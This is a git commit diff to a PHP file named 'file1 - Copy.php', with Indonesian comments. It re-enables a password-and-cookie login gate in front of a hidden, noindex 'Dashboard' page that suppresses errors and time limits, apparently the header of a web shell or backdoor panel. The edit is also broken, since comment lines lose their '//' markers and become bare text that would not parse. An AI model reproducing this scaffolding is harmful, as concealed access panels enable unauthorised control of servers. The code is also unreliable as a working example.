736a25f55d36cda9bf4def5cca9018c3e1a9fdd0
raitokazuki <97198960+RaitoKazuki@users.noreply.github.com>
2025-04-20 04:12:00 +0700

    Update file1 - Copy.php

--- file1 - Copy.php
+++ file1 - Copy.php
@@ -5,28 +5,28 @@ set_time_limit(0);
 error_reporting(0);
 ini_set('display_errors', 0);
 ini_set('max_execution_time', 5000);
-// Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik
-// $hashed_password = '$2y$10$1b05G7jPhNAe9KEJbpyspOTC1N0y28nY913UBKFfWnmbApEgI9QHy';
+Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik
+$hashed_password = '$2y$10$1b05G7jPhNAe9KEJbpyspOTC1N0y28nY913UBKFfWnmbApEgI9QHy';
 
-// Fungsi untuk menampilkan form login
-// function admin_login() {
-//     echo '<title>Login</title>';
-//     echo '<form method="post">';
-//     echo '<input type="password" name="password">';
-//     echo '<input type="submit" value="Login">';
-//     echo '</form>';
-//     exit;
-// }
+Fungsi untuk menampilkan form login
+function admin_login() {
+echo '<title>Login</title>';
+echo '<form method="post">';
+echo '<input type="password" name="password">';
+echo '<input type="submit" value="Login">';
+echo '</form>';
+exit;
+ }
 
-// if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
-//     // Memeriksa apakah password dikirim dan benar
-//     if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
-//         setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie berlaku selama 1 jam
-//         // Logika setelah login berhasil
-//     } else {
-//         admin_login();
-//     }
-// }
+if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
+Memeriksa apakah password dikirim dan benar
+if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
+setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie berlaku selama 1 jam
+Logika setelah login berhasil
+} else {
+admin_login();
+}
+}
 
 $head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="robots" content="noindex"><title>Dashboard</title><style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style></head>';
 
